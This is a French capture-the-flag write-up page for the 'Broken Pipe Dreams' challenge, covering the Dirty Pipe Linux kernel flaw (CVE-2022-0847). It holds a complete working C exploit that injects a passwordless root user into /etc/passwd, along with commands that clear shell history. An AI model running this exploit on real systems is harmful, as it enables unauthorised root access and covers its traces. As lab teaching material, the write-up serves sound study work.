@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>PROMETHEUS_9 - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "PROMETHEUS_9";
+        var mkdocs_page_input_path = "Systeme\\writeup_DirtyPipe_PROMETHEUS-9_v2.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reseau</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag060-Analyse_capture_r%C3%A9seau/">Analyse_capture_réseau</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag114-pcap-forensic/">cap-forensic-mot de passe d'un archive</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Cryptographie</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/Double_Encryption_0142/">Double encryption</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/Myrox_Infiltration_0143/">Myrox Infiltration</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/writeup_falsification/">Falsification</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">osint</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../osint/Atterissage_Urgence_0145/">Atterrisage Urgence</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Stegano</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../steganographie/Transmission_Alien_0141/">Transmission Alien</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reverse</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/strings-0084/">Strings on binary</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/binary-analyze-0083/">Binary analyze</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/patch-xxxx/">Binary patching</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/writeup_reverseEngineering/">ReverseEngineering</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Logiciel</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_blocsCompresse/">Blocs Compressés</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_obfuscation/">Obfuscation</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_polygotte/">Polygotte</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Systeme</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_SUID_XENON-1/">XENON-1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_CronTab_HERALD-7_v2/">HERALD-7</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">PROMETHEUS_9</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#informations-du-challenge">Informations du challenge</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#description">Description</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#mise-en-place-de-lenvironnement-organisateurs">Mise en place de l'environnement (organisateurs)</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#prerequis-kernel">Prérequis kernel</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#creation-des-flags-et-de-lenvironnement">Création des flags et de l'environnement</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#write-up-resolution-pas-a-pas">Write-up — Résolution pas à pas</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-1-connexion-et-reconnaissance-initiale">Étape 1 — Connexion et reconnaissance initiale</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-2-decouverte-et-dechiffrement-du-flag-intermediaire">Étape 2 — Découverte et déchiffrement du flag intermédiaire</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-3-identification-de-la-surface-dattaque">Étape 3 — Identification de la surface d'attaque</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-4-comprehension-de-la-vulnerabilite">Étape 4 — Compréhension de la vulnérabilité</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-5-preparation-de-lexploit">Étape 5 — Préparation de l'exploit</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-6-compilation-et-execution">Étape 6 — Compilation et exécution</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#resume-de-lattaque">Résumé de l'attaque</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#nettoyage-post-ctf">Nettoyage (post-CTF)</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#flags">Flags</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#references">Références</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_PwnKit_SHADOW-5/">SHADOW-5</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_PHANTOM-4/">PHANTOM-4</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Misc</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../autre/Destruction_Vaisseau_0144/">Destruction Vaisseau</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Systeme</li>
+      <li class="breadcrumb-item active">PROMETHEUS_9</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="write-up-broken-pipe-dreams">Write-up — Broken Pipe Dreams</h1>
+<p><strong>CryptAbyss CTF 2026 | Catégorie : Linux Kernel Exploitation</strong></p>
+<hr />
+<h2 id="informations-du-challenge">Informations du challenge</h2>
+<table>
+<thead>
+<tr>
+<th>Champ</th>
+<th>Détail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nom</td>
+<td>Broken Pipe Dreams</td>
+</tr>
+<tr>
+<td>Vaisseau</td>
+<td>PROMETHEUS-9</td>
+</tr>
+<tr>
+<td>CVE</td>
+<td>CVE-2022-0847 (Dirty Pipe)</td>
+</tr>
+<tr>
+<td>CVSS</td>
+<td>7.8 — HIGH</td>
+</tr>
+<tr>
+<td>Difficulté</td>
+<td>Hard</td>
+</tr>
+<tr>
+<td>Catégorie</td>
+<td>System</td>
+</tr>
+<tr>
+<td>OS cible</td>
+<td>Ubuntu 21.10 (Impish Indri)</td>
+</tr>
+<tr>
+<td>Kernel cible</td>
+<td>Linux 5.15.0-23-generic</td>
+</tr>
+<tr>
+<td>Auteur</td>
+<td>Jeffrey JOANNEN / System</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="description">Description</h2>
+<blockquote>
+<p>Le serveur de développement du vaisseau PROMETHEUS-9 tourne sur un noyau Linux récent — du moins, c'est ce que l'admin croit. En réalité, il n'a jamais fait de <code>dist-upgrade</code>.</p>
+<p>Vous avez un shell en tant qu'utilisateur <code>operative</code>. <code>/root/flag.txt</code> vous attend, mais <code>/root</code> est inaccessible.</p>
+<p>La réponse est dans le noyau lui-même.</p>
+</blockquote>
+<p><strong>Accès fourni :</strong></p>
+<pre><code>User : operative
+Pass : TheAlienThueurDuPROM2020!
+</code></pre>
+<hr />
+<h2 id="mise-en-place-de-lenvironnement-organisateurs">Mise en place de l'environnement (organisateurs)</h2>
+<h3 id="prerequis-kernel">Prérequis kernel</h3>
+<p>La faille CVE-2022-0847 affecte les noyaux Linux entre les versions <strong>5.8</strong> et <strong>5.16.11 / 5.15.25 / 5.10.102</strong> (exclus). Il faut une VM avec un noyau dans cette plage, non patché.</p>
+<pre><code class="language-bash"># Vérifier le noyau
+uname -r
+# 5.15.0-23-generic  ← vulnérable (&lt; 5.15.25)
+
+# Bloquer les mises à jour noyau
+sudo apt-mark hold linux-image-generic linux-headers-generic
+</code></pre>
+<h3 id="creation-des-flags-et-de-lenvironnement">Création des flags et de l'environnement</h3>
+<pre><code class="language-bash">useradd -m -s /bin/bash operative
+echo &quot;operative:TheAlienThueurDuPROM2020!&quot; | chpasswd
+
+# Flag final
+echo &quot;CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}&quot; &gt; /root/flag.txt
+chmod 600 /root/flag.txt
+
+# Flag intermédiaire 1 — chiffré AES-256-CBC dans un dotfile caché
+mkdir -p /var/prometheus/flux
+echo -n &quot;CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}&quot; \
+    | openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -a \
+      -pass pass:'Prometheus9-Flux-Archive-2094!' \
+    &gt; /var/prometheus/flux/.energy_report.txt
+chmod 644 /var/prometheus/flux/.energy_report.txt
+
+# Lore : masque partiellement le mécanisme de la faille, révèle la passphrase
+cat &gt; /home/operative/.pipe_anomaly.txt &lt;&lt; 'LORE'
+[ JOURNAL DE BORD INTERNE — VAISSEAU PROMETHEUS-9 ]
+
+Cycle 2094.20 — Note personnelle :
+  Version noyau : CONFIDENTIAL
+  Statut patch  : EN ATTENTE — non prioritaire
+
+  La faille : ********* depuis un fichier vers un pipe ne
+  reinitialise pas le *************.
+  Un ******* suivant ecrit dans le page cache du fichier
+  source sans verification de permissions.
+
+  De plus, une clé est caché dans le fichier des variables de configuration du système de patrouille,
+  mais elle est chiffrée dans le fichier de flux energetiques.
+  Voici la passphrase : 'Prometheus9-Flux-Archive-2094!',
+
+  Versions concernees : CONFIDENTIAL
+  Notre version : dans la plage. Non patchee.
+
+  — Ingenieur #304
+LORE
+chown operative:operative /home/operative/.pipe_anomaly.txt
+chmod 600 /home/operative/.pipe_anomaly.txt
+</code></pre>
+<hr />
+<h2 id="write-up-resolution-pas-a-pas">Write-up — Résolution pas à pas</h2>
+<h3 id="etape-1-connexion-et-reconnaissance-initiale">Étape 1 — Connexion et reconnaissance initiale</h3>
+<pre><code class="language-bash">id
+# uid=1001(operative) gid=1001(operative) groups=1001(operative)
+
+sudo -l
+# User operative may not run sudo on prometheus-9.
+
+uname -r
+# 5.15.0-23-generic
+
+uname -a
+# Linux prometheus-9 5.15.0-23-generic #23-Ubuntu SMP Mon Feb 7 17:35:36 UTC 2022
+
+cat /etc/os-release | head -3
+# NAME=&quot;Ubuntu&quot;
+# VERSION=&quot;21.10 (Impish Indri)&quot;
+</code></pre>
+<p>Pas de sudo. On lit le lore :</p>
+<pre><code class="language-bash">cat ~/.pipe_anomaly.txt
+</code></pre>
+<p>Le journal est partiellement censuré sur le mécanisme technique (splice/page cache), mais il révèle directement la passphrase à utiliser pour déchiffrer un fichier de flux énergétiques : <code>Prometheus9-Flux-Archive-2094!</code>.</p>
+<h3 id="etape-2-decouverte-et-dechiffrement-du-flag-intermediaire">Étape 2 — Découverte et déchiffrement du flag intermédiaire</h3>
+<pre><code class="language-bash">find /var/prometheus -type f 2&gt;/dev/null
+# /var/prometheus/flux/.energy_report.txt
+
+cat /var/prometheus/flux/.energy_report.txt
+# U2FsdGVkX19OXVSIoHdsDe0UzDyDLQ4Uvg4Y9gNCYHHqOVHduggMG2Y9egS9BkaF
+# RfMuPTPYqkEGoalx8wi2EqnDQ2jjv4UO1+m1/faEue8=
+</code></pre>
+<p>Le contenu est chiffré (en-tête <code>Salted__</code> en base64, signature d'un chiffrement OpenSSL). Avec la passphrase trouvée dans le lore :</p>
+<pre><code class="language-bash">openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -a \
+    -in /var/prometheus/flux/.energy_report.txt \
+    -pass pass:'Prometheus9-Flux-Archive-2094!'
+# CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}
+</code></pre>
+<h3 id="etape-3-identification-de-la-surface-dattaque">Étape 3 — Identification de la surface d'attaque</h3>
+<p>Sans sudo et sans SUID exploitable évident, on cherche d'autres vecteurs. L'énumération système pointe vers le kernel :</p>
+<pre><code class="language-bash"># Pas de sudo, pas de SUID intéressant
+find / -perm -4000 -type f 2&gt;/dev/null
+# Rien d'exploitable via GTFOBins
+
+# La version du kernel attire l'attention
+uname -r
+# 5.15.0-23-generic
+
+ls -la /root/
+# Permission denied — cible confirmée
+
+# Vérifier les CVE connues sur ce kernel
+# 5.15.0-23 → Ubuntu 21.10, février 2022 → CVE-2022-0847 (Dirty Pipe)
+</code></pre>
+<p>La version <code>5.15.0-23</code> est antérieure au patch <code>5.15.25</code>. Recoupement avec les CVE publiées en mars 2022 → <strong>CVE-2022-0847 (Dirty Pipe)</strong>.</p>
+<h3 id="etape-4-comprehension-de-la-vulnerabilite">Étape 4 — Compréhension de la vulnérabilité</h3>
+<p>CVE-2022-0847 (Dirty Pipe) est une vulnérabilité dans la gestion des <strong>pipes</strong> du noyau Linux.</p>
+<p><strong>Mécanisme de la faille :</strong></p>
+<p>Le système de pipes utilise des pages mémoire partagées avec le <em>page cache</em> (cache de fichiers). Lors d'une écriture dans un pipe, le noyau initialise le flag <code>PIPE_BUF_FLAG_CAN_MERGE</code> pour optimiser les fusions de buffers. Ce flag <strong>n'est pas correctement réinitialisé</strong> lors d'un <code>splice()</code> depuis un fichier vers un pipe. Une page du page cache d'un fichier root (même en lecture seule) se retrouve alors fusionnable. Un <code>write()</code> suivant écrit directement dans cette page cache, <strong>modifiant le fichier sur disque sans vérification de permissions.</strong></p>
+<pre><code>Fichier read-only (ex: /etc/passwd)
+    ↓ splice() → pipe
+Page cache partagée — flag CAN_MERGE non réinitialisé
+    ↓ write() dans le pipe
+Écriture directe dans le page cache → modification du fichier sur disque
+</code></pre>
+<p><strong>Stratégie :</strong> écraser la première ligne de <code>/etc/passwd</code> pour insérer un utilisateur <code>pwned</code> avec UID 0 et sans mot de passe, puis <code>su pwned</code> pour obtenir un shell root.</p>
+<h3 id="etape-5-preparation-de-lexploit">Étape 5 — Préparation de l'exploit</h3>
+<pre><code class="language-bash">mkdir /tmp/pipe &amp;&amp; cd /tmp/pipe
+</code></pre>
+<p><strong>Fichier <code>dirtypipe.c</code> :</strong></p>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+
+static const char NEW_ROOT_LINE[] =
+    &quot;pwned::0:0:root:/root:/bin/bash\n&quot;;
+
+static int write_via_pipe(int fd, loff_t offset,
+                          const char *data, size_t len)
+{
+    int pipefd[2];
+    if (pipe(pipefd) &lt; 0) { perror(&quot;[-] pipe&quot;); return -1; }
+
+    // Remplir le pipe pour initialiser les pages avec le flag CAN_MERGE
+    const size_t pipe_size = 65536;
+    char *buf = malloc(pipe_size);
+    memset(buf, 0, pipe_size);
+    write(pipefd[1], buf, pipe_size);
+    read(pipefd[0], buf, pipe_size);  // Vider — le flag reste actif
+    free(buf);
+
+    // splice() depuis le fichier → partage la page cache
+    loff_t off = offset;
+    if (splice(fd, &amp;off, pipefd[1], NULL, 1, 0) &lt; 0) {
+        perror(&quot;[-] splice&quot;); return -1;
+    }
+
+    // write() → écrit dans la page cache du fichier cible
+    if (write(pipefd[1], data, len) &lt; 0) {
+        perror(&quot;[-] write payload&quot;); return -1;
+    }
+
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return 0;
+}
+
+int main(void)
+{
+    int fd = open(&quot;/etc/passwd&quot;, O_RDONLY);
+    if (fd &lt; 0) { perror(&quot;[-] open&quot;); return 1; }
+
+    printf(&quot;[*] Injection du payload via Dirty Pipe...\n&quot;);
+
+    // offset 1 : splice requiert offset &gt; 0
+    if (write_via_pipe(fd, 1, NEW_ROOT_LINE + 1,
+                       strlen(NEW_ROOT_LINE) - 1) &lt; 0) {
+        fprintf(stderr, &quot;[-] Échec\n&quot;);
+        close(fd);
+        return 1;
+    }
+
+    close(fd);
+    printf(&quot;[+] /etc/passwd modifié !\n&quot;);
+    system(&quot;head -1 /etc/passwd&quot;);
+    system(&quot;su pwned -c 'id &amp;&amp; cat /root/flag.txt'&quot;);
+    return 0;
+}
+</code></pre>
+<h3 id="etape-6-compilation-et-execution">Étape 6 — Compilation et exécution</h3>
+<pre><code class="language-bash">gcc -o dirtypipe dirtypipe.c
+./dirtypipe
+</code></pre>
+<p><strong>Sortie attendue :</strong></p>
+<pre><code>[*] Injection du payload via Dirty Pipe...
+[+] /etc/passwd modifié !
+pwned::0:0:root:/root:/bin/bash
+uid=0(root) gid=0(root) groups=0(root)
+CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
+</code></pre>
+<p><strong>Flag :</strong> <code>CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}</code></p>
+<hr />
+<h2 id="resume-de-lattaque">Résumé de l'attaque</h2>
+<pre><code>operative (uid=1001)
+    ↓ cat ~/.pipe_anomaly.txt → passphrase révélée dans le lore
+    ↓ déchiffre /var/prometheus/flux/.energy_report.txt → flag intermediaire 1
+    ↓ uname -r → 5.15.0-23 → recherche CVE → CVE-2022-0847 identifiée
+    ↓ gcc dirtypipe.c → ./dirtypipe
+    ↓ splice() + write() → page cache /etc/passwd corrompu
+    ↓ su pwned (uid=0, sans mot de passe)
+root shell (uid=0)
+    ↓ cat /root/flag.txt
+CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
+</code></pre>
+<hr />
+<h2 id="nettoyage-post-ctf">Nettoyage (post-CTF)</h2>
+<pre><code class="language-bash">su pwned -c &quot;sed -i '1s/.*/root:x:0:0:root:\/root:\/bin\/bash/' /etc/passwd&quot;
+rm -rf /tmp/pipe
+history -c &amp;&amp; rm ~/.bash_history
+</code></pre>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Valeur</th>
+<th>Forme déposée sur le disque</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Intermédiaire 1</td>
+<td><code>CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}</code></td>
+<td>Chiffré AES-256-CBC (base64) dans <code>/var/prometheus/flux/.energy_report.txt</code>, passphrase révélée dans le lore</td>
+</tr>
+<tr>
+<td>Final</td>
+<td><code>CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}</code></td>
+<td>En clair dans <code>/root/flag.txt</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="references">Références</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0847">NVD — CVE-2022-0847</a></li>
+<li><a href="https://dirtypipe.cm4all.com/">Article original de Max Kellermann</a></li>
+<li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903">Patch noyau Linux upstream</a></li>
+<li><a href="https://ubuntu.com/security/notices/USN-5317-1">Ubuntu Security Notice USN-5317-1</a></li>
+</ul>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../writeup_CronTab_HERALD-7_v2/" class="btn btn-neutral float-left" title="HERALD-7"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../writeup_PwnKit_SHADOW-5/" class="btn btn-neutral float-right" title="SHADOW-5">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../writeup_CronTab_HERALD-7_v2/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../writeup_PwnKit_SHADOW-5/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
